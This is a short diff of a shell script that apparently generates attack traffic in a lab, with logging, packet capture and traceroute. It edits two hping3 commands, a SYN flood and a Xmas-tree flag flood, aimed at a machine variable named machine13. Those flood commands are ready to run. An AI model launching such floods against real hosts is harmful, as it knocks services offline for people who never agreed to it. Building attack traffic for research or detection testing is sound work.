@@ -177,7 +177,7 @@ attack_log="/home/logs/SYN_attack.log"
 attack_duration=$((7*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 --flood --frag -p "$destination_port" -S $destination_ip"
+attack_script="hping3 --flood -p "$destination_port" -S $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -227,6 +227,6 @@ attack_log="/home/logs/xmas.log"
 attack_duration=$((4*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 --flood -p "$destination_port" -F -S -R -P -A -U -X -Y "$destination_ip""
+attack_script="hping3 --flood -p "$destination_port" -F -S -P -A -U -X -Y "$destination_ip""
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
